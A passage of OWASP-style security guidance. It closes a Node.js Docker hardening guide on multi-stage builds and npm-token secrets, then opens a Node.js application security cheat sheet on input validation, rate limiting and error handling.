[fastify.close()](https://www.fastify.io/docs/latest/Server/) which returns a promise that we will await, and Fastify will also take care to respond to every new connection with the HTTP status code 503 to signal that the application is unavailable.\r\n\r\nLet’s add our event handler:\r\n\r\n    async function closeGracefully(signal) {\r\n       console.log(`*^!@4=> Received signal to terminate: ${signal}`)\r\n     \r\n       await fastify.close()\r\n       // await db.close() if we have a db connection in this app\r\n       // await other things we should cleanup nicely\r\n       process.exit()\r\n    }\r\n    process.on('SIGINT', closeGracefully)\r\n    process.on('SIGTERM', closeGracefully)\r\n\r\nAdmittedly, this is more of a generic web application concern than Dockerfile related, but is even more important in orchestrated environments.\r\n\r\n## 7) Find and fix security vulnerabilities in your Node.js docker image\r\n\r\nSee [Docker Security Cheat Sheet - Use static analysis tools](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html#rule-9-use-static-analysis-tools)\r\n\r\n## 8) Use multi-stage builds\r\n\r\nMulti-stage builds are a great way to move from a simple, yet potentially erroneous Dockerfile, into separated steps of building a Docker image, so we can avoid leaking sensitive information. Not only that, but we can also use a bigger Docker base image to install our dependencies, compile any native npm packages if needed, and then copy all these artifacts into a small production base image, like our alpine example.\r\n\r\n### Prevent sensitive information leak\r\n\r\nThe use-case here to avoid sensitive information leakage is more common than you think.\r\n\r\nIf you’re building Docker images for work, there’s a high chance that you also maintain private npm packages. If that’s the case, then you probably needed to find some way to make that secret `NPM_TOKEN` available to the npm install.\r\n\r\nHere’s an example for what I’m talking about:\r\n\r\n    FROM node:lts-alpine@sha256:b2da3316acdc2bec442190a1fe10dc094e7ba4121d029cb32075ff59bb27390a\r\n    RUN apk add dumb-init\r\n    ENV NODE_ENV production\r\n    ENV NPM_TOKEN 1234\r\n    WORKDIR /usr/src/app\r\n    COPY --chown=node:node . .\r\n    #RUN npm ci --only=production\r\n    RUN echo \"//registry.npmjs.org/:_authToken=$NPM_TOKEN\" > .npmrc && \\\r\n       npm ci --only=production\r\n    USER node\r\n    CMD [\"dumb-init\", \"node\", \"server.js\"]\r\n\r\nDoing this, however, leaves the `.npmrc` file with the secret npm token inside the Docker image. You could attempt to improve it by deleting it afterwards, like this:\r\n\r\n    RUN echo \"//registry.npmjs.org/:_authToken=$NPM_TOKEN\" > .npmrc && \\\r\n       npm ci --only=production\r\n    RUN rm -rf .npmrc\r\n\r\nHowever, now the `.npmrc` file is available in a different layer of the Docker image. If this Docker image is public, or someone is able to access it somehow, then your token is compromised. A better improvement would be as follows:\r\n\r\n    RUN echo \"//registry.npmjs.org/:_authToken=$NPM_TOKEN\" > .npmrc && \\\r\n       npm ci --only=production; \\\r\n       rm -rf .npmrc\r\n\r\nThe problem now is that the Dockerfile itself needs to be treated as a secret asset, because it contains the secret npm token inside it.\r\n\r\nLuckily, Docker supports a way to pass arguments into the build process:\r\n\r\n    ARG NPM_TOKEN\r\n    RUN echo \"//registry.npmjs.org/:_authToken=$NPM_TOKEN\" > .npmrc && \\\r\n       npm ci --only=production; \\\r\n       rm -rf .npmrc\r\n\r\nAnd then we build it as follows:\r\n\r\n**`$ docker build . -t nodejs-tutorial --build-arg NPM\\_TOKEN=1234`**\r\n\r\nI know you were thinking that we’re all done at this point but, sorry to disappoint 🙂\r\n\r\nThat’s how it is with security—sometimes the obvious things are yet just another pitfall.\r\n\r\nWhat’s the problem now, you ponder? Build arguments passed like that to Docker are kept in the history log. Let’s see with our own eyes. Run this command:\r\n\r\n**`$ docker history nodejs-tutorial`**\r\n\r\nwhich prints the following:\r\n\r\n    IMAGE          CREATED              CREATED BY                                      SIZE      COMMENT\r\n    b4c2c78acaba   About a minute ago   CMD [\"dumb-init\" \"node\" \"server.js\"]            0B        buildkit.dockerfile.v0\r\n    <missing>      About a minute ago   USER node                                       0B        buildkit.dockerfile.v0\r\n    <missing>      About a minute ago   RUN |1 NPM_TOKEN=1234 /bin/sh -c echo \"//reg…   5.71MB    buildkit.dockerfile.v0\r\n    <missing>      About a minute ago   ARG NPM_TOKEN                                   0B        buildkit.dockerfile.v0\r\n    <missing>      About a minute ago   COPY . . # buildkit                             15.3kB    buildkit.dockerfile.v0\r\n    <missing>      About a minute ago   WORKDIR /usr/src/app                            0B        buildkit.dockerfile.v0\r\n    <missing>      About a minute ago   ENV NODE_ENV=production                         0B        buildkit.dockerfile.v0\r\n    <missing>      About a minute ago   RUN /bin/sh -c apk add dumb-init # buildkit     1.65MB    buildkit.dockerfile.v0\r\n\r\nDid you spot the secret npm token there? That’s what I mean.\r\n\r\nThere’s a great way to manage secrets for the container image, but this is the time to introduce multi-stage builds as a mitigation for this issue, as well as showing how we can build minimal images.\r\n\r\n### Introducing multi-stage builds for Node.js Docker images\r\n\r\nJust like that principle in software development of Separation of Concerns, we’ll apply the same ideas in order to build our Node.js Docker images. We’ll have one image that we use to build everything that we need for the Node.js application to run, which in a Node.js world, means installing npm packages, and compiling native npm modules if necessary. That will be our first stage.\r\n\r\nThe second Docker image, representing the second stage of the Docker build, will be the production Docker image. This second and last stage is the image that we actually optimize for and publish to a registry, if we have one. That first image that we’ll refer to as the `build` image, gets discarded and is left as a dangling image in the Docker host that built it, until it gets cleaned.\r\n\r\nHere is the update to our Dockerfile that represents our progress so far, but separated into two stages:\r\n\r\n    # --------------> The build image\r\n    FROM node:latest AS build\r\n    ARG NPM_TOKEN\r\n    WORKDIR /usr/src/app\r\n    COPY package*.json /usr/src/app/\r\n    RUN echo \"//registry.npmjs.org/:_authToken=$NPM_TOKEN\" > .npmrc && \\\r\n       npm ci --only=production && \\\r\n       rm -f .npmrc\r\n     \r\n    # --------------> The production image\r\n    FROM node:lts-alpine@sha256:b2da3316acdc2bec442190a1fe10dc094e7ba4121d029cb32075ff59bb27390a\r\n    RUN apk add dumb-init\r\n    ENV NODE_ENV production\r\n    USER node\r\n    WORKDIR /usr/src/app\r\n    COPY --chown=node:node --from=build /usr/src/app/node_modules /usr/src/app/node_modules\r\n    COPY --chown=node:node . /usr/src/app\r\n    CMD [\"dumb-init\", \"node\", \"server.js\"]\r\n\r\nAs you can see, I chose a bigger image for the `build` stage because I might need tooling like `gcc` (the GNU Compiler Collection) to compile native npm packages, or for other needs.\r\n\r\nIn the second stage, there’s a special notation for the `COPY` directive that copies the `node_modules/` folder from the build Docker image into this new production base image.\r\n\r\nAlso, now, do you see that `NPM_TOKEN` passed as build argument to the `build` intermediary Docker image? It’s not visible anymore in the `docker history nodejs-tutorial` command output because it doesn’t exist in our production docker image.\r\n\r\n## 9) Keeping unnecessary files out of your Node.js Docker images\r\n\r\nYou have a `.gitignore` file to avoid polluting the git repository with unnecessary files, and potentially sensitive files too, right? The same applies to Docker images.\r\n\r\nDocker has a `.dockerignore` which will ensure it skips sending any glob pattern matches inside it to the Docker daemon. Here is a list of files to give you an idea of what you might be putting into your Docker image that we’d ideally want to avoid:\r\n\r\n    .dockerignore\r\n    node_modules\r\n    npm-debug.log\r\n    Dockerfile\r\n    .git\r\n    .gitignore\r\n\r\nAs you can see, the `node_modules/` is actually quite important to skip because if we hadn’t ignored it, then the simplistic Dockerfile version that we started with would have caused the local `node_modules/` folder to be copied over to the container as-is.\r\n\r\n    FROM node@sha256:b2da3316acdc2bec442190a1fe10dc094e7ba4121d029cb32075ff59bb27390a\r\n    WORKDIR /usr/src/app\r\n    COPY . /usr/src/app\r\n    RUN npm install\r\n    CMD \"npm\" \"start\"\r\n\r\nIn fact, it’s even more important to have a `.dockerignore` file when you are practicing multi-stage Docker builds. To refresh your memory on how the 2nd stage Docker build looks like:\r\n\r\n    # --------------> The production image\r\n    FROM node:lts-alpine\r\n    RUN apk add dumb-init\r\n    ENV NODE_ENV production\r\n    USER node\r\n    WORKDIR /usr/src/app\r\n    COPY --chown=node:node --from=build /usr/src/app/node_modules /usr/src/app/node_modules\r\n    COPY --chown=node:node . /usr/src/app\r\n    CMD [\"dumb-init\", \"node\", \"server.js\"]\r\n\r\nThe importance of having a `.dockerignore` is that when we do a `COPY . /usr/src/app` from the 2nd Dockerfile stage, we’re also copying over any local node\\_modules/ to the Docker image. That’s a big no-no as we may be copying over modified source code inside `node_modules/`.\r\n\r\nOn top of that, since we’re using the wildcard `COPY .` we may also be copying into the Docker image sensitive files that include credentials or local configuration.\r\n\r\nThe take-away here for a `.dockerignore` file is:\r\n\r\n- Skip potentially modified copies of `node_modules/` in the Docker image.\r\n- Saves you from secrets exposure such as credentials in the contents of `.env` or `aws.json` files making their way into the Node.js Docker image.\r\n- It helps speed up Docker builds because it ignores files that would have otherwise caused a cache invalidation. For example, if a log file was modified, or a local environment configuration file, all would’ve caused the Docker image cache to invalidate at that layer of copying over the local directory.\r\n\r\n## 10) Mounting secrets into the Docker build image\r\n\r\nOne thing to note about the `.dockerignore` file is that it is an all or nothing approach and can’t be turned on or off per build stages in a Docker multi-stage build.\r\n\r\nWhy is it important? Ideally, we would want to use the `.npmrc` file in the build stage, as we may need it because it includes a secret npm token to access private npm packages. Perhaps it also needs a specific proxy or registry configuration to pull packages from.\r\n\r\nThis means that it makes sense to have the `.npmrc` file available to the `build` stage—however, we don’t need it at all in the second stage for the production image, nor do we want it there as it may include sensitive information, like the secret npm token.\r\n\r\nOne way to mitigate this `.dockerignore` caveat is to mount a local file system that will be available for the build stage, but there’s a better way.\r\n\r\nDocker supports a relatively new capability referred to as Docker secrets, and is a natural fit for the case we need with `.npmrc`. Here is how it works:\r\n\r\n- When we run the `docker build` command we will specify command-line arguments that define a new secret ID and reference a file as the source of the secret.\r\n- In the Dockerfile, we will add flags to the `RUN` directive to install the production npm, which mounts the file referred by the secret ID into the target location—the local directory `.npmrc` file which is where we want it available.\r\n- The `.npmrc` file is mounted as a secret and is never copied into the Docker image.\r\n- Lastly, let’s not forget to add the `.npmrc` file to the contents of the `.dockerignore` file so it doesn’t make it into the image at all, for either the build nor production images.\r\n\r\nLet’s see how all of it works together. First the updated `.dockerignore` file:\r\n\r\n    .dockerignore\r\n    node_modules\r\n    npm-debug.log\r\n    Dockerfile\r\n    .git\r\n    .gitignore\r\n    .npmrc\r\n\r\nThen, the complete Dockerfile, with the updated RUN directive to install npm packages while specifying the `.npmrc` mount point:\r\n\r\n    # --------------> The build image\r\n    FROM node:latest AS build\r\n    WORKDIR /usr/src/app\r\n    COPY package*.json /usr/src/app/\r\n    RUN --mount=type=secret,mode=0644,id=npmrc,target=/usr/src/app/.npmrc npm ci --only=production\r\n     \r\n    # --------------> The production image\r\n    FROM node:lts-alpine\r\n    RUN apk add dumb-init\r\n    ENV NODE_ENV production\r\n    USER node\r\n    WORKDIR /usr/src/app\r\n    COPY --chown=node:node --from=build /usr/src/app/node_modules /usr/src/app/node_modules\r\n    COPY --chown=node:node . /usr/src/app\r\n    CMD [\"dumb-init\", \"node\", \"server.js\"]\r\n\r\nAnd finally, the command that builds the Node.js Docker image:\r\n\r\n    docker build . -t nodejs-tutorial --secret id=npmrc,src=.npmrc\r\n\r\n**Note:** Secrets are a new feature in Docker and if you’re using an older version, you might need to enable it Buildkit as follows:\r\n\r\n    DOCKER_BUILDKIT=1 docker build . -t nodejs-tutorial --build-arg NPM_TOKEN=1234 --secret id=npmrc,src=.npmrc\r\n"
    },
    {
      "Nodejs_Security_Cheat_Sheet.md": "# NodeJS Security Cheat Sheet\r\n\r\n## Introduction\r\n\r\nThis cheat sheet lists actions developers can take to develop secure Node.js applications. Each item has a brief explanation and solution that is specific to the Node.js environment.\r\n\r\n## Context\r\n\r\nNode.js applications are increasing in number and they are no different from other frameworks and programming languages. Node.js applications are prone to all kinds of web application vulnerabilities.\r\n\r\n## Objective\r\n\r\nThis cheat sheet aims to provide a list of best practices to follow during development of Node.js applications.\r\n\r\n## Recommendations\r\n\r\nThere are several recommendations to enhance security of your Node.js applications. These are categorized as:\r\n\r\n- **Application Security**\r\n- **Error & Exception Handling**\r\n- **Server Security**\r\n- **Platform Security**\r\n\r\n### Application Security\r\n\r\n#### Use flat Promise chains\r\n\r\nAsynchronous callback functions are one of the strongest features of Node.js. However, increasing layers of nesting within callback functions can become a problem. Any multistage process can become nested 10 or more levels deep. This problem is referred to as a \"Pyramid of Doom\" or \"Callback Hell\". In such code, the errors and results get lost within the callback. Promises are a good way to write asynchronous code without getting into nested pyramids. Promises provide top-down execution while being asynchronous by delivering errors and results to next `.then` function.\r\n\r\nAnother advantage of Promises is the way Promises handle errors. If an error occurs in a Promise class, it skips over the `.then` functions and invokes the first `.catch` function it finds. This way Promises provide a higher assurance of capturing and handling errors. As a principle, you can make all your asynchronous code (apart from emitters) return promises. It should be noted that Promise calls can also become a pyramid. In order to completely stay away from \"Callback Hell\", flat Promise chains should be used. If the module you are using does not support Promises, you can convert base object to a Promise by using `Promise.promisifyAll()` function.\r\n\r\nThe following code snippet is an example of \"Callback Hell\":\r\n\r\n```JavaScript\r\nfunction func1(name, callback) {\r\n  // operations that takes a bit of time and then calls the callback\r\n}\r\nfunction func2(name, callback) {\r\n  // operations that takes a bit of time and then calls the callback\r\n}\r\nfunction func3(name, callback) {\r\n  // operations that takes a bit of time and then calls the callback\r\n}\r\nfunction func4(name, callback) {\r\n  // operations that takes a bit of time and then calls the callback\r\n}\r\n\r\nfunc1(\"input1\", function(err, result1){\r\n   if(err){\r\n      // error operations\r\n   }\r\n   else {\r\n      //some operations\r\n      func2(\"input2\", function(err, result2){\r\n         if(err){\r\n            //error operations\r\n         }\r\n         else{\r\n            //some operations\r\n            func3(\"input3\", function(err, result3){\r\n               if(err){\r\n                  //error operations\r\n               }\r\n               else{\r\n                  // some operations\r\n                  func4(\"input 4\", function(err, result4){\r\n                     if(err){\r\n                        // error operations\r\n                     }\r\n                     else {\r\n                        // some operations\r\n                     }\r\n                  });\r\n               }\r\n            });\r\n         }\r\n      });\r\n   }\r\n});\r\n```\r\n\r\nThe above code can be securely written as follows using a flat Promise chain:\r\n\r\n```JavaScript\r\nfunction func1(name) {\r\n  // operations that takes a bit of time and then resolves the promise\r\n}\r\nfunction func2(name) {\r\n  // operations that takes a bit of time and then resolves the promise\r\n}\r\nfunction func3(name) {\r\n  // operations that takes a bit of time and then resolves the promise\r\n}\r\nfunction func4(name) {\r\n  // operations that takes a bit of time and then resolves the promise\r\n}\r\n\r\nfunc1(\"input1\")\r\n   .then(function (result){\r\n      return func2(\"input2\");\r\n   })\r\n   .then(function (result){\r\n      return func3(\"input3\");\r\n   })\r\n   .then(function (result){\r\n      return func4(\"input4\");\r\n   })\r\n   .catch(function (error) {\r\n      // error operations\r\n   });\r\n```\r\n\r\nAnd using async/await:\r\n\r\n```JavaScript\r\nfunction async func1(name) {\r\n  // operations that takes a bit of time and then resolves the promise\r\n}\r\nfunction async func2(name) {\r\n  // operations that takes a bit of time and then resolves the promise\r\n}\r\nfunction async func3(name) {\r\n  // operations that takes a bit of time and then resolves the promise\r\n}\r\nfunction async func4(name) {\r\n  // operations that takes a bit of time and then resolves the promise\r\n}\r\n\r\n(async() => {\r\n  try {\r\n    let res1 = await func1(\"input1\");\r\n    let res2 = await func2(\"input2\");\r\n    let res3 = await func3(\"input2\");\r\n    let res4 = await func4(\"input2\");\r\n  } catch(err) {\r\n    // error operations\r\n  }\r\n})();\r\n```\r\n\r\n#### Set request size limits\r\n\r\nBuffering and parsing of request bodies can be a resource intensive task. If there is no limit on the size of requests, attackers can send requests with large request bodies that can exhaust server memory and/or fill disk space. You can limit the request body size for all requests using [raw-body](https://www.npmjs.com/package/raw-body).\r\n\r\n```JavaScript\r\nconst contentType = require('content-type')\r\nconst express = require('express')\r\nconst getRawBody = require('raw-body')\r\n\r\nconst app = express()\r\n\r\napp.use(function (req, res, next) {\r\n  if (!['POST', 'PUT', 'DELETE'].includes(req.method)) {\r\n    next()\r\n    return\r\n  }\r\n\r\n  getRawBody(req, {\r\n    length: req.headers['content-length'],\r\n    limit: '1kb',\r\n    encoding: contentType.parse(req).parameters.charset\r\n  }, function (err, string) {\r\n    if (err) return next(err)\r\n    req.text = string\r\n    next()\r\n  })\r\n})\r\n```\r\n\r\nHowever, fixing a request size limit for all requests may not be the correct behavior, since some requests may have a large payload in the request body, such as when uploading a file. Also, input with a JSON type is more dangerous than a multipart input, since parsing JSON is a blocking operation. Therefore, you should set request size limits for different content types. You can accomplish this very easily with express middleware as follows:\r\n\r\n```JavaScript\r\napp.use(express.urlencoded({ extended: true, limit: \"1kb\" }));\r\napp.use(express.json({ limit: \"1kb\" }));\r\n```\r\n\r\nIt should be noted that attackers can change the `Content-Type` header of the request and bypass request size limits. Therefore, before processing the request, data contained in the request should be validated against the content type stated in the request headers. If content type validation for each request affects the performance severely, you can only validate specific content types or request larger than a predetermined size.\r\n\r\n#### Do not block the event loop\r\n\r\nNode.js is very different from common application platforms that use threads. Node.js has a single-thread event-driven architecture. By means of this architecture, throughput becomes high and the programming model becomes simpler. Node.js is implemented around a non-blocking I/O event loop. With this event loop, there is no waiting on I/O or context switching. The event loop looks for events and dispatches them to handler functions. Because of this, when CPU intensive JavaScript operations are executed, the event loop waits for them to finish. This is why such operations are called \"blocking\". To overcome this problem, Node.js allows assigning callbacks to IO-blocked events. This way, the main application is not blocked and callbacks run asynchronously. Therefore, as a general principle, all blocking operations should be done asynchronously so that the event loop is not blocked.\r\n\r\nEven if you perform blocking operations asynchronously, your application may still not serve as expected. This happens if there is a code outside the callback that relies on the code within the callback to run first. For example, consider the following code:\r\n\r\n```JavaScript\r\nconst fs = require('fs');\r\nfs.readFile('/file.txt', (err, data) => {\r\n  // perform actions on file content\r\n});\r\nfs.unlinkSync('/file.txt');\r\n```\r\n\r\nIn the above example, `unlinkSync` function may run before the callback, which will delete the file before the desired actions on the file content is done. Such race conditions can also affect the security of your application. An example would be a scenario where authentication is performed in a callback and authenticated actions are run synchronously. In order to eliminate such race conditions, you can write all operations that rely on each other in a single non-blocking function. By doing so, you can guarantee that all operations are executed in the correct order. For example, above code example can be written in a non-blocking way as follows:\r\n\r\n```JavaScript\r\nconst fs = require('fs');\r\nfs.readFile('/file.txt', (err, data) => {\r\n  // perform actions on file content\r\n  fs.unlink('/file.txt', (err) => {\r\n    if (err) throw err;\r\n  });\r\n});\r\n```\r\n\r\nIn the above code, call to unlink the file and other file operations are within the same callback. This provides the correct order of operations.\r\n\r\n#### Perform input validation\r\n\r\nInput validation is a crucial part of application security. Input validation failures can result in many types of application attacks. These include SQL Injection, Cross-Site Scripting, Command Injection, Local/Remote File Inclusion, Denial of Service, Directory Traversal, LDAP Injection and many other injection attacks. In order to avoid these attacks, input to your application should be sanitized first. The best input validation technique is to use a list of accepted inputs. However, if this is not possible, input should be first checked against expected input scheme and dangerous inputs should be escaped. In order to ease input validation in Node.js applications, there are some modules like [validator](https://www.npmjs.com/package/validator) and [express-mongo-sanitize](https://www.npmjs.com/package/express-mongo-sanitize).\r\nFor detailed information on input validation, please refer to [Input Validation Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html).\r\n\r\nJavaScript is a dynamic language and depending on how the framework parses a URL, the data seen by the application code can take many forms. Here are some examples after parsing a query string in express.js:\r\n\r\n| URL | Content of request.query.foo in code |\r\n| --- | --- |\r\n| `?foo=bar` | `'bar'` (string) |\r\n| `?foo=bar&foo=baz` | `['bar', 'baz']` (array of string) |\r\n| `?foo[]=bar` | `['bar']` (array of string) |\r\n| `?foo[]=bar&foo[]=baz` | `['bar', 'baz']` (array of string) |\r\n| `?foo[bar]=baz` | `{ bar : 'baz' }` (object with a key) |\r\n| `?foo[]=bar` | `['bar']` (array of string) |\r\n| `?foo[]baz=bar` | `['bar']` (array of string - postfix is lost) |\r\n| `?foo[][baz]=bar` | `[ { baz: 'bar' } ]` (array of object) |\r\n| `?foo[bar][baz]=bar` | `{ foo: { bar: { baz: 'bar' } } }` (object tree) |\r\n| `?foo[10]=bar&foo[9]=baz` | `[ 'baz', 'bar' ]` (array of string - notice order) |\r\n| `?foo[toString]=bar` | `{}` (object where calling `toString()` will fail) |\r\n\r\n#### Perform output escaping\r\n\r\nIn addition to input validation, you should escape all HTML and JavaScript content shown to users via application in order to prevent cross-site scripting (XSS) attacks. You can use [escape-html](https://github.com/component/escape-html) or [node-esapi](https://github.com/ESAPI/node-esapi) libraries to perform output escaping.\r\n\r\n#### Perform application activity logging\r\n\r\nLogging application activity is an encouraged good practice. It makes it easier to debug any errors encountered during application runtime. It is also useful for security concerns, since it can be used during incident response. In addition, these logs can be used to feed Intrusion Detection/Prevention Systems (IDS/IPS). In Node.js, there are modules such as [Winston](https://www.npmjs.com/package/winston), [Bunyan](https://www.npmjs.com/package/bunyan), or [Pino](https://www.npmjs.com/package/pino) to perform application activity logging. These modules enable streaming and querying logs, and they provide a way to handle uncaught exceptions.\r\n\r\nWith the following code, you can log application activities in both console and a desired log file:\r\n\r\n```JavaScript\r\nconst logger = new (Winston.Logger) ({\r\n    transports: [\r\n        new (winston.transports.Console)(),\r\n        new (winston.transports.File)({ filename: 'application.log' })\r\n    ],\r\n    level: 'verbose'\r\n});\r\n```\r\n\r\nYou can provide different transports so that you can save errors to a separate log file and general application logs to a different log file. Additional information on security logging can be found in [Logging Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html).\r\n\r\n#### Monitor the event loop\r\n\r\nWhen your application server is under heavy network traffic, it may not be able to serve its users. This is essentially a type of [Denial of Service (DoS)](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html) attack. The [toobusy-js](https://www.npmjs.com/package/toobusy-js) module allows you to monitor the event loop. It keeps track of the response time, and when it goes beyond a certain threshold, this module can indicate your server is too busy. In that case, you can stop processing incoming requests and send them `503 Server Too Busy` message so that your application stay responsive. Example use of the [toobusy-js](https://www.npmjs.com/package/toobusy-js) module is shown here:\r\n\r\n```JavaScript\r\nconst toobusy = require('toobusy-js');\r\nconst express = require('express');\r\nconst app = express();\r\napp.use(function(req, res, next) {\r\n    if (toobusy()) {\r\n        // log if you see necessary\r\n        res.status(503).send(\"Server Too Busy\");\r\n    } else {\r\n    next();\r\n    }\r\n});\r\n```\r\n\r\n#### Take precautions against brute-forcing\r\n\r\n[Brute-forcing](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html#protect-against-automated-attacks\r\n) is a common threat to all web applications. Attackers can use brute-forcing as a password guessing attack to obtain account passwords. Therefore, application developers should take precautions against brute-force attacks especially in login pages.  Node.js has several modules available for this purpose. [Express-bouncer](https://libraries.io/npm/express-bouncer), [express-brute](https://libraries.io/npm/express-brute) and [rate-limiter](https://libraries.io/npm/rate-limiter) are just some examples. Based on your needs and requirements, you should choose one or more of these modules and use accordingly. [Express-bouncer](https://libraries.io/npm/express-bouncer) and [express-brute](https://libraries.io/npm/express-brute) modules work similarly. They increase the delay for each failed request and can be arranged for a specific route. These modules can be used as follows:\r\n\r\n```JavaScript\r\nconst bouncer = require('express-bouncer');\r\nbouncer.whitelist.push('127.0.0.1'); // allow an IP address\r\n// give a custom error message\r\nbouncer.blocked = function (req, res, next, remaining) {\r\n    res.status(429).send(\"Too many requests have been made. Please wait \" + remaining/1000 + \" seconds.\");\r\n};\r\n// route to protect\r\napp.post(\"/login\", bouncer.block, function(req, res) {\r\n    if (LoginFailed){  }\r\n    else {\r\n        bouncer.reset( req );\r\n    }\r\n});\r\n```\r\n\r\n```JavaScript\r\nconst ExpressBrute = require('express-brute');\r\n\r\nconst store = new ExpressBrute.MemoryStore(); // stores state locally, don't use this in production\r\nconst bruteforce = new ExpressBrute(store);\r\n\r\napp.post('/auth',\r\n    bruteforce.prevent, // error 429 if we hit this route too often\r\n    function (req, res, next) {\r\n        res.send('Success!');\r\n    }\r\n);\r\n```\r\n\r\nApart from [express-bouncer](https://libraries.io/npm/express-bouncer) and [express-brute](https://libraries.io/npm/express-brute), the [rate-limiter](https://libraries.io/npm/rate-limiter) module can also help to prevent brute-forcing attacks. It enables specifying how many requests a specific IP address can make during a specified time period.\r\n\r\n```JavaScript\r\nconst limiter = new RateLimiter();\r\nlimiter.addLimit('/login', 'GET', 5, 500); // login page can be requested 5 times at max within 500 seconds\r\n```\r\n\r\n[CAPTCHA usage](https://cheatsheetseries.owasp.org/cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html#captcha) is also another common mechanism used against brute-forcing. There are modules developed for Node.js CAPTCHAs. A common module used in Node.js applications is [svg-captcha](https://www.npmjs.com/package/svg-captcha). It can be used as follows:\r\n\r\n```JavaScript\r\nconst svgCaptcha = require('svg-captcha');\r\napp.get('/captcha', function (req, res) {\r\n    const captcha = svgCaptcha.create();\r\n    req.session.captcha = captcha.text;\r\n    res.type('svg');\r\n    res.status(200).send(captcha.data);\r\n});\r\n```\r\n\r\n[Account lockout](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html#account-lockout) is a recommended solution to keep attackers away from your valid users. Account lockout is possible with many modules like [mongoose](https://www.npmjs.com/package/mongoose). You can refer to [this blog post](http://devsmash.com/blog/implementing-max-login-attempts-with-mongoose) to see how account lockout is implemented in mongoose.\r\n\r\n#### Use Anti-CSRF tokens\r\n\r\n[Cross-Site Request Forgery (CSRF)](https://owasp.org/www-community/attacks/csrf) aims to perform authorized actions on behalf of an authenticated user, while the user is unaware of this action. CSRF attacks are generally performed for state-changing requests like changing a password, adding users or placing orders. [Csurf](https://www.npmjs.com/package/csurf) is an express middleware that has been used to mitigate CSRF attacks. But a security hole in this package has been recently discovered. The team behind the package has not fixed the discovered vulnerability and they have marked the package as deprecated, recommending using any other CSRF protection package.\r\n\r\nFor detailed information on cross-site request forgery (CSRF) attacks and prevention methods, you can refer to [Cross-Site Request Forgery Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html).\r\n\r\n#### Remove unnecessary routes\r\n\r\nA web application should not contain any page that is not used by users, as it may increase the attack surface of the application. Therefore, all unused API routes should be disabled in Node.js applications. This occurs especially in frameworks like [Sails](https://sailsjs.com) and [Feathers](https://feathersjs.com), as they automatically generate REST API endpoints. For example, in [Sails](https://sailsjs.com), if a URL does not match a custom route, it may match one of the automatic routes and still generate a response. This situation may lead to results ranging from information leakage to arbitrary command execution. Therefore, before using such frameworks and modules, it is important to know the routes they automatically generate and remove or disable these routes.\r\n\r\n#### Prevent HTTP Parameter Pollution\r\n\r\n[HTTP Parameter Pollution(HPP)](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution.html) is an attack in which attackers send multiple HTTP parameters with the same name and this causes your application to interpret them unpredictably. When multiple parameter values are sent, Express populates them in an array. In order to solve this issue, you can use [hpp](https://www.npmjs.com/package/hpp) module. When used, this module will ignore all values submitted for a parameter in `req.query` and/or `req.body` and just select the last parameter value submitted. You can use it as follows:\r\n\r\n```JavaScript\r\nconst hpp = require('hpp');\r\napp.use(hpp());\r\n```\r\n\r\n#### Only return what is necessary\r\n\r\nInformation about the users of an application is among the most critical information about the application. User tables generally include fields like id, username, full name, email address, birth date, password and in some cases social security numbers. Therefore, when querying and using user objects, you need to return only needed fields as it may be vulnerable to personal information disclosure. This is also correct for other objects stored on the database. If you just need a certain field of an object, you should only return the specific fields required. As an example, you can use a function like the following whenever you need to get information on a user. By doing so, you can only return the fields that are needed for your specific operation. In other words, if you only need to list names of the users available, you are not returning their email addresses or credit card numbers in addition to their full names.\r\n\r\n```JavaScript\r\nexports.sanitizeUser = function(user) {\r\n  return {\r\n    id: user.id,\r\n    username: user.username,\r\n    fullName: user.fullName\r\n  };\r\n};\r\n```\r\n\r\n#### Use object property descriptors\r\n\r\nObject properties include three hidden attributes: `writable` (if false, property value cannot be changed), `enumerable` (if false, property cannot be used in for loops) and `configurable` (if false, property cannot be deleted). When defining an object property through assignment, these three hidden attributes are set to true by default. These properties can be set as follows:\r\n\r\n```JavaScript\r\nconst o = {};\r\nObject.defineProperty(o, \"a\", {\r\n    writable: true,\r\n    enumerable: true,\r\n    configurable: true,\r\n    value: \"A\"\r\n});\r\n```\r\n\r\nApart from these, there are some special functions for object attributes. `Object.preventExtensions()` prevents new properties from being added to the object.\r\n\r\n#### Use access control lists\r\n\r\nAuthorization prevents users from acting outside of their intended permissions. In order to do so, users and their roles should be determined with consideration of the principle of least privilege. Each user role should only have access to the resources they must use. For your Node.js applications, you can use the [acl](https://www.npmjs.com/package/acl) module to provide ACL (access control list) implementation. With this module, you can create roles and assign users to these roles.\r\n\r\n### Error & Exception Handling\r\n\r\n#### Handle uncaughtException\r\n\r\nNode.js behavior for uncaught exceptions is to print current stack trace and then terminate the thread. However, Node.js allows customization of this behavior. It provides a global object named process that is available to all Node.js applications. It is an EventEmitter object and in case of an uncaught exception, uncaughtException event is emitted and it is brought up to the main event loop. In order to provide a custom behavior for uncaught exceptions, you can bind to this event. However, resuming the application after such an uncaught exception can lead to further problems. Therefore, if you do not want to miss any uncaught exception, you should bind to uncaughtException event and cleanup any allocated resources like file descriptors, handles and similar before shutting down the process. Resuming the application is strongly discouraged as the application will be in an unknown state. It is important to note that when displaying error messages to the user in case of an uncaught exception, detailed information like stack traces should not be revealed to the user. Instead, custom error messages should be shown to the users in order not to cause any information leakage.\r\n\r\n```JavaScript\r\nprocess.on(\"uncaughtException\", function(err) {\r\n    // clean up allocated resources\r\n    // log necessary error details to log files\r\n    process.exit(); // exit the process to avoid unknown state\r\n});\r\n```\r\n\r\n#### Listen to errors when using EventEmitter\r\n\r\nWhen using EventEmitter, errors can occur anywhere in the event chain. Normally, if an error occurs in an EventEmitter object, an error event that has an Error object as an argument is called. However, if there are no attached listeners to that error event, the Error object that is sent as an argument is thrown and becomes an uncaught exception. In short, if you do not handle errors within an EventEmitter object properly, these unhandled errors may crash your application. 